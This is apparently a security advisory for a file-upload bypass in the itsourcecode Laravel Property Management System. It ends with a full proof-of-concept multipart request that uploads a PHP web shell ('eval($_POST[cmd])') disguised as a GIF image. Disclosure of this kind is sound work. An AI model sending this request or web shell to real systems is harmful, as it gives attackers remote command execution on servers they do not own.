# Vendor

itsourcecode

# Product

Laravel Property Management System

# version

V1.0

# Download 

https://itsourcecode.com/wp-content/uploads/2021/10/Property-Management-System-Laravel.zip

# Vulnerability

FileUpload

# Description

In the PropertiesController.php controller, the upload method is used to upload images. However, since the image detection rules in the UpdatePropertiesRequest class can be bypassed, attackers can directly upload Webshell files.

# Analysis

1. Visit the backend "/admin/properties/create" location to upload pictures. The uploaded pictures will be handled by the update method of the app/Http/Controllers/Admin/PropertiesController.php controller.
<img width="1022" alt="image" src="https://github.com/user-attachments/assets/55a44c60-3ca0-451e-8e8f-cf0b7d84dd99">

2. In the upload method, the detection rule is located in the rule() method of the UpdatePropertiesRequest class. The photo file type passed in by the user must be a picture. This rule is fine. The problem is that the attacker can modify the photo to any name when uploading the file, because the saveFiles() method does not read the file content in the specified parameter, but traverses it through the "($request->hasFile($key))" method.
<img width="652" alt="image" src="https://github.com/user-attachments/assets/3d2e79a8-99ff-4602-a3c8-7337ebe2597a">
<img width="1003" alt="image" src="https://github.com/user-attachments/assets/2c841df1-5729-44dc-9a6e-a973742961f5">

# POC
```
POST /admin/properties HTTP/1.1
Host: <host:port>
Content-Length: 862
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.17.22:8000
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary5jIWWI3hIJsIxXKJ
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.17.22:8000/admin/properties/create
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: <change cookies>
Connection: close

------WebKitFormBoundary5jIWWI3hIJsIxXKJ
Content-Disposition: form-data; name="_token"

XabMXjldHui8xdksPHFAvs6FdhR8vPvdZyVMMnpx
------WebKitFormBoundary5jIWWI3hIJsIxXKJ
Content-Disposition: form-data; name="name"

mirage
------WebKitFormBoundary5jIWWI3hIJsIxXKJ
Content-Disposition: form-data; name="address"

aaaa
------WebKitFormBoundary5jIWWI3hIJsIxXKJ
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/png

GIF89a
<?php eval($_POST["cmd"]);?>

------WebKitFormBoundary5jIWWI3hIJsIxXKJ
Content-Disposition: form-data; name="photo_max_size"

2
------WebKitFormBoundary5jIWWI3hIJsIxXKJ
Content-Disposition: form-data; name="photo_max_width"

4096
------WebKitFormBoundary5jIWWI3hIJsIxXKJ
Content-Disposition: form-data; name="photo_max_height"

4096
------WebKitFormBoundary5jIWWI3hIJsIxXKJ--

```
